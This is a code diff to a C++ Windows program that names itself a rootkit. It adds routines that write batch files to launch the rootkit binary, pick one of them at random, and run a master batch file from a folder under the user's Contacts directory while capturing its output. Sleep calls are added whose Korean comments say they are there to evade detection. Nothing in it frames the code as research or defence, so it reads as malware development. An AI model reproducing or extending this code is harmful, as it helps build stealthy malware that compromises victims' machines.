@@ -23,6 +23,7 @@
 #include <unordered_map>
 #include <filesystem>
 #include <algorithm>
+#include <random>
 
 
 #include "rootkit.hpp"
@@ -87,6 +88,7 @@ namespace rootkit {
 	std::vector<std::string> get_username_list();
 	std::vector<std::string> get_username_list_not_admin();
 	std::string get_program_host_username();
+	std::string run_batch_with_output(const std::string& batchFilePath);
 
 	std::vector<Queue> queueLists;
 	std::unordered_map<std::string, std::vector<Code>> codes;
@@ -326,7 +328,7 @@ namespace rootkit {
 
 		if (run1Bat.is_open()) {
 			run1Bat << "@echo off" << '\n';
-			run1Bat << "start /B " + rtkFileName << '\n';
+			run1Bat << "call ./" + rtkFileName << '\n';
 		}
 		else return PathStatus::Error;
 		
@@ -334,14 +336,76 @@ namespace rootkit {
 		
 		if (run2Bat.is_open()) {
 			run2Bat << "@echo off" << '\n';
-			run2Bat << "start /B " + rtkFileName << '\n';
+			run2Bat << "call ./" + rtkFileName << '\n';
 		}
 		else return PathStatus::Error;
 
 		std::ofstream runMasterBat(fileName3);
 
+		std::random_device rd;
+		std::mt19937 gen(rd());
+
+		std::uniform_int_distribution<int> dis(1, 2);
+
+		Sleep(1000); // 탐지 우회용 Sleep
+		int whatFileShouldIChoose = dis(gen);
+		Sleep(1000); // 탐지 우회용 Sleep. 안걸리면 장땡이고 걸리면 아쉬운거지
+
 		if (runMasterBat.is_open()) {
-			runMasterBat <<
+			runMasterBat << "@echo off" << '\n';
+			runMasterBat << "call ./run" << whatFileShouldIChoose << ".bat" << '\n';
+			return PathStatus::Success;
 		}
+		else return PathStatus::Error;
+	}
+	
+	bool is_file_exists(std::string& path) {
+		CA2W path_w(path.c_str());
+		DWORD dwAttrib = GetFileAttributesW(path_w);
+
+		return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
+	}
+
+	BatchFileResult start_run_bat() {
+		std::string dir = "C:Users/" + rootkit::get_program_host_username() + "Contacts/port";
+		std::string masterFileDir = dir + "/runMaster.bat";
+		bool masterFileExists = is_file_exists(masterFileDir);
+
+		if (masterFileExists) {
+			std::string result = rootkit::run_batch_with_output(masterFileDir);
+			BatchFileResult batchFileResult;
+			batchFileResult.isSuccessToRun = true;
+			batchFileResult.result = result;
+			return batchFileResult;
+		}
+		else {
+			BatchFileResult batchFileResult;
+			batchFileResult.isSuccessToRun = false;
+			batchFileResult.result = "";
+			return batchFileResult;
+		}
+	}
+
+	std::string run_batch_with_output(const std::string& batchFilePath) {
+		std::string final_cmd = "chcp 65001 > nul && \"" + batchFilePath + "\" 2>&1";
+
+		std::array<char, 128> buffer;
+		std::string result;
+
+		FILE* pipe = _popen(final_cmd.c_str(), "r");
+		if (!pipe) return "Error: Failed to open pipe";
+
+		try {
+			while (fgets(buffer.data(), static_cast<int>(buffer.size()), pipe) != nullptr) {
+				result += buffer.data();
+			}
+		}
+		catch (...) {
+			_pclose(pipe);
+			throw;
+		}
+
+		_pclose(pipe);
+		return result;
 	}
 }
